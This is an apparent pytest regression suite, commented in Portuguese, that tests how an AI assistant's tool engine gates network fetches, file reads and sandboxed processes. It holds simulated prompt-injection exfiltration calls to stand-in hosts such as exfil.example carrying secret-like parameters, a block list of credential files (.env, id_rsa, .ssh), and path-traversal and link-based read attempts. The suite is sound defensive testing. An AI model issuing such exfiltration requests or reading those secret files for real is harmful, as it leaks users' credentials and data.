"""Regressões do hardening avançado (docs/ENSLAVED-ADVANCED-SECURITY-HARDENING.md). Dados fictícios, sem rede externa."""

import asyncio
import io
import os
import sys
import threading
import time
import zipfile

import pytest

from backend.core import sandbox
from backend.core.config import FsToolsSettings, ToolsSettings
from backend.providers.base import ChatTurn, ToolCall
from backend.tools.builtin.fs_read import FsReadTool
from backend.tools.engine import ToolEngine
from backend.tools.net_guard import egress_details
from backend.tools.permissions import PermissionManager
from backend.tools.policy import ToolPolicy
from backend.tools.registry import AuditLog, ToolRegistry
from tests.test_security_audit import FakeFetch, _injection_service, _run
from tests.test_tools_builtin import POLICY_DECISION


class Clock:
    def __init__(self):
        self.now = 1000.0

    def __call__(self):
        return self.now


def make_engine(tmp_path, modes=None, clock=None, **settings_kw):
    settings = ToolsSettings(permission_modes=modes or {"net.fetch": "ask", "fs.read": "ask"}, **settings_kw)
    policy = ToolPolicy(settings)
    permissions = PermissionManager(policy, clock=clock or time.monotonic)
    registry = ToolRegistry()
    fetch = FakeFetch()
    registry.register(fetch)
    engine = ToolEngine(registry, policy, permissions, AuditLog(tmp_path / "audit.jsonl"), settings)
    return engine, permissions, fetch


async def _approve_remembering(engine, permissions, tool_id, args, conv):
    prepared = await engine.prepare(tool_id, args, conversation_id=conv)
    assert prepared.state == "needs_permission"
    assert permissions.resolve(prepared.request.id, granted=True, remember_session=True) is not None
    return prepared


# ------------------------------------------------------------------ 1. política de saída de rede


def test_remembered_fetch_grant_is_bound_to_domain_and_conversation(tmp_path):
    engine, permissions, _ = make_engine(tmp_path)

    async def scenario():
        await _approve_remembering(engine, permissions, "net.fetch", {"url": "https://receitas.example/bolo"}, "A")
        same = await engine.prepare("net.fetch", {"url": "https://receitas.example/torta"}, conversation_id="A")
        other_host = await engine.prepare("net.fetch", {"url": "https://exfil.example/c"}, conversation_id="A")
        other_conv = await engine.prepare("net.fetch", {"url": "https://receitas.example/torta"}, conversation_id="B")
        return same.state, other_host.state, other_conv.state

    assert asyncio.run(scenario()) == ("ready", "needs_permission", "needs_permission")


def test_search_approval_does_not_authorize_model_fetch(tmp_path):
    engine, permissions, _ = make_engine(tmp_path)

    async def scenario():
        request = engine.request_web_permission("preço do dólar hoje", "A")
        permissions.resolve(request.id, granted=True, remember_session=True)
        fetch = await engine.prepare("net.fetch", {"url": "https://exfil.example/c?d=x"}, conversation_id="A")
        return engine.web_state("A"), engine.web_state("B"), fetch.state

    assert asyncio.run(scenario()) == ("allow", "ask", "needs_permission")


@pytest.mark.parametrize(
    "url",
    [
        "https://receitas.example/x?email=dono@example.com",
        "https://receitas.example/x?api_token=abc",
        "https://receitas.example/x?d=" + "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0NTY3ODk",
        "https://receitas.example/x?cpf=123.456.789-00",
        "https://receitas.example/" + "a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7",
    ],
)
def test_sensitive_url_needs_card_even_with_domain_grant(tmp_path, url):
    engine, permissions, _ = make_engine(tmp_path)

    async def scenario():
        await _approve_remembering(engine, permissions, "net.fetch", {"url": "https://receitas.example/bolo"}, "A")
        return await engine.prepare("net.fetch", {"url": url}, conversation_id="A")

    prepared = asyncio.run(scenario())
    assert prepared.state == "needs_permission"
    reason = prepared.request.reason
    assert "Destino: receitas.example" in reason and f"URL completa: {url}" in reason
    assert "Possíveis dados sensíveis" in reason


def test_card_shows_destination_params_and_untrusted_warning(tmp_path):
    engine, _, _ = make_engine(tmp_path)
    prepared = asyncio.run(
        engine.prepare("net.fetch", {"url": "https://exfil.example/c?d=SEGREDO&lang=pt"}, conversation_id="A", untrusted_context=True)
    )
    reason = prepared.request.reason
    assert "Destino: exfil.example" in reason
    assert "Parâmetros enviados: d=SEGREDO; lang=pt" in reason
    assert "conteúdo externo" in reason


def test_allow_mode_still_asks_in_untrusted_context_without_explicit_opt_in(tmp_path):
    modes = {"net.fetch": "allow"}
    engine, _, _ = make_engine(tmp_path, modes)
    url = {"url": "https://exfil.example/c?d=x"}
    assert asyncio.run(engine.prepare("net.fetch", url, conversation_id="A")).state == "ready"  # contexto limpo
    assert asyncio.run(engine.prepare("net.fetch", url, conversation_id="A", untrusted_context=True)).state == "needs_permission"
    assert len(engine.config_warnings()) == 1

    unsafe, _, _ = make_engine(tmp_path, modes, unsafe_allow_untrusted_egress=True)
    assert asyncio.run(unsafe.prepare("net.fetch", url, conversation_id="A", untrusted_context=True)).state == "ready"
    assert any("unsafe_allow_untrusted_egress" in w for w in unsafe.config_warnings())


def test_egress_details_flags_only_suspicious_values():
    host, params, warnings = egress_details("https://docs.python.org/3/library/os.html?highlight=path&lang=pt")
    assert host == "docs.python.org" and params == ["highlight=path", "lang=pt"] and warnings == []
    _, _, warnings = egress_details("https://x.example/a?session=1&to=dono%40exemplo.com")
    assert any("'session'" in w for w in warnings) and any("e-mail" in w for w in warnings)


def test_injected_page_cannot_exfiltrate_to_granted_domain_either(tmp_path):
    """Mesmo o domínio concedido exige cartão quando a página injetada pede a chamada."""
    service, fetch = _injection_service(
        tmp_path,
        [
            ChatTurn(content="", tool_calls=[ToolCall(name="net.fetch", arguments='{"url": "https://receitas.example/bolo"}')]),
            ChatTurn(content="", tool_calls=[ToolCall(name="net.fetch", arguments='{"url": "https://receitas.example/c?d=SEGREDO"}')]),
            ChatTurn(content="feito"),
        ],
    )
    events = asyncio.run(_run(service))
    assert fetch.urls == ["https://receitas.example/bolo"]
    assert events[-1]["status"] == "awaiting_permission"


def test_grant_from_other_conversation_does_not_cover_chat(tmp_path):
    service, fetch = _injection_service(
        tmp_path, [ChatTurn(content="", tool_calls=[ToolCall(name="net.fetch", arguments='{"url": "https://receitas.example/bolo"}')])]
    )
    other = service.repo.create_conversation()
    events = asyncio.run(_collect(service.send_stream(other.id, "resuma https://receitas.example/bolo")))
    assert fetch.urls == [] and events[-1]["status"] == "awaiting_permission"


async def _collect(stream):
    return [e async for e in stream]


# ------------------------------------------------------------------ 2. permissões por conversa, prazo e revogação


def test_grant_expires_and_can_be_revoked(tmp_path):
    clock = Clock()
    engine, permissions, _ = make_engine(tmp_path, clock=clock)
    args = {"url": "https://receitas.example/bolo"}

    async def scenario():
        await _approve_remembering(engine, permissions, "net.fetch", args, "A")
        assert (await engine.prepare("net.fetch", args, conversation_id="A")).state == "ready"
        clock.now += 31 * 60
        assert (await engine.prepare("net.fetch", args, conversation_id="A")).state == "needs_permission"
        assert permissions.active_grants() == []
        await _approve_remembering(engine, permissions, "net.fetch", args, "A")
        await _approve_remembering(engine, permissions, "net.fetch", args, "B")
        assert permissions.revoke(conversation_id="A") == 1
        return (await engine.prepare("net.fetch", args, conversation_id="A")).state, [g["conversation_id"] for g in permissions.active_grants()]

    assert asyncio.run(scenario()) == ("needs_permission", ["B"])


def test_expired_request_cannot_be_approved_or_replayed(tmp_path):
    clock = Clock()
    engine, permissions, fetch = make_engine(tmp_path, clock=clock)

    async def scenario():
        prepared = await engine.prepare("net.fetch", {"url": "https://receitas.example/bolo"}, conversation_id="A")
        engine.remember_invocation(prepared, source="chat", conversation_id="A")
        clock.now += 16 * 60
        assert permissions.pending_requests() == []
        assert permissions.resolve(prepared.request.id, granted=True) is None
        assert await engine.complete_invocation(prepared.request.id, None) is not None  # negada, sem executar
        return fetch.urls

    assert asyncio.run(scenario()) == []


def test_fs_grant_is_bound_to_folder(tmp_path):
    engine, permissions, _ = make_engine(tmp_path)
    engine._registry.register(FsReadTool(FsToolsSettings(allowed_roots=[tmp_path])))

    async def scenario():
        await _approve_remembering(engine, permissions, "fs.read", {"path": "docs/a.md"}, "A")
        same = await engine.prepare("fs.read", {"path": "docs/b.md"}, conversation_id="A")
        other = await engine.prepare("fs.read", {"path": "config/settings.yaml"}, conversation_id="A")
        sneaky = await engine.prepare("fs.read", {"path": "docs/../config/x.yaml"}, conversation_id="A")
        return same.state, other.state, sneaky.state

    assert asyncio.run(scenario()) == ("ready", "needs_permission", "needs_permission")


def test_web_search_decision_expires(tmp_path, monkeypatch):
    service, _ = _injection_service(tmp_path, [])
    service.record_web_decision("conv-1", True, "preço do dólar hoje")
    real = time.monotonic
    monkeypatch.setattr("backend.chat.service.time.monotonic", lambda: real() + 16 * 60)
    assert service._take_web_decision("conv-1", "preço do dólar hoje") is None


def test_revoke_endpoint_and_grant_listing(client):
    first = client.post("/api/tools/fs.read/invoke", json={"arguments": {"path": "docs/x.md"}}).json()
    client.post(f"/api/permissions/{first['request']['id']}/decision", json={"granted": True, "remember_session": True})
    grants = client.get("/api/permissions").json()["grants"]
    assert grants and grants[0]["capability"] == "fs.read" and grants[0]["target"] == os.path.normcase("docs")
    assert 0 < grants[0]["expires_in_seconds"] <= 1800
    assert client.delete("/api/permissions/grants").json()["revoked"] == 1
    assert client.get("/api/tools").json()["session_grants"] == []
    again = client.post("/api/tools/fs.read/invoke", json={"arguments": {"path": "docs/x.md"}}).json()
    assert again["status"] == "permission_required"


# ------------------------------------------------------------------ 3. isolamento de arquivos


def _fs(tmp_path):
    root = tmp_path / "root"
    root.mkdir()
    return FsReadTool(FsToolsSettings(allowed_roots=[root])), root


def _read(tool, path):
    return asyncio.run(tool.run({"path": path}, POLICY_DECISION))


@pytest.mark.parametrize(
    "name", [".env", ".env.local", "enslaved.db", "enslaved.db-wal", "tool-audit.jsonl", "id_rsa", "chave.pem",
             "credentials.json", ".git/config", "learning/backups/notas.txt", ".ssh/known_hosts"],
)
def test_fs_read_refuses_sensitive_files(tmp_path, name):
    tool, root = _fs(tmp_path)
    target = root / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text("SEGREDO-FICTICIO", encoding="utf-8")
    result = _read(tool, name)
    assert result.ok is False and "sensível" in result.error


def test_fs_read_keeps_legitimate_reads(tmp_path):
    tool, root = _fs(tmp_path)
    (root / "docs" / "sub").mkdir(parents=True)
    (root / "docs" / "sub" / "nota.md").write_text("conteúdo legítimo", encoding="utf-8")
    (root / "settings.yaml").write_text("porta: 8000", encoding="utf-8")
    assert _read(tool, "docs/sub/nota.md").output == "conteúdo legítimo"
    assert _read(tool, "docs/../settings.yaml").ok is True


@pytest.mark.skipif(os.name != "nt", reason="junções NTFS")
def test_fs_read_refuses_junctions_inside_and_outside_root(tmp_path):
    import _winapi

    tool, root = _fs(tmp_path)
    outside = tmp_path / "fora"
    outside.mkdir()
    (outside / "segredo.txt").write_text("SEGREDO-FICTICIO", encoding="utf-8")
    inside = root / "real"
    inside.mkdir()
    (inside / "ok.txt").write_text("dentro", encoding="utf-8")
    _winapi.CreateJunction(str(outside), str(root / "ponte"))
    _winapi.CreateJunction(str(inside), str(root / "atalho"))
    assert _read(tool, "ponte/segredo.txt").ok is False
    blocked = _read(tool, "atalho/ok.txt")
    assert blocked.ok is False and "link" in blocked.error
    assert _read(tool, "real/ok.txt").ok is True


def test_fs_read_refuses_hard_links(tmp_path):
    tool, root = _fs(tmp_path)
    original = tmp_path / "fora.txt"
    original.write_text("SEGREDO-FICTICIO", encoding="utf-8")
    try:
        os.link(original, root / "duro.txt")
    except OSError:
        pytest.skip("hard link indisponível")
    result = _read(tool, "duro.txt")
    assert result.ok is False and "hard link" in result.error


def test_fs_read_rejects_file_swapped_between_check_and_open(tmp_path, monkeypatch):
    tool, root = _fs(tmp_path)
    (root / "a.txt").write_text("A", encoding="utf-8")
    (root / "b.txt").write_text("B", encoding="utf-8")
    other = os.stat(root / "b.txt")
    real_lstat = os.lstat
    monkeypatch.setattr(os, "lstat", lambda p, *a, **k: other if str(p).endswith("a.txt") else real_lstat(p, *a, **k))
    result = _read(tool, "a.txt")
    assert result.ok is False and "mudou" in result.error


# ------------------------------------------------------------------ 4. processamento isolado de documentos


@pytest.mark.skipif(os.name != "nt", reason="teto de memória via Job Object só no Windows")
def test_sandbox_enforces_memory_limit():
    code, out, isolated, timed_out = sandbox.run_limited(
        [sys.executable, "-c", "import sys; sys.stdin.read(1); x = bytearray(600 * 1024 * 1024); print('ALOCOU')"],
        timeout=30, memory_limit=200 * 1024 * 1024,
    )
    assert isolated and not timed_out and code != 0 and b"ALOCOU" not in out


def test_sandbox_timeout_kills_process_tree_quickly():
    # o neto herda o stdout: se sobrevivesse, communicate() ficaria preso até ele terminar (60 s)
    code = (
        "import sys, subprocess, time; sys.stdin.read(1);"
        "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'], stdout=sys.stdout); time.sleep(60)"
    )
    started = time.monotonic()
    _code, _out, _isolated, timed_out = sandbox.run_limited([sys.executable, "-c", code], timeout=2, memory_limit=512 * 1024 * 1024)
    assert timed_out and time.monotonic() - started < 15
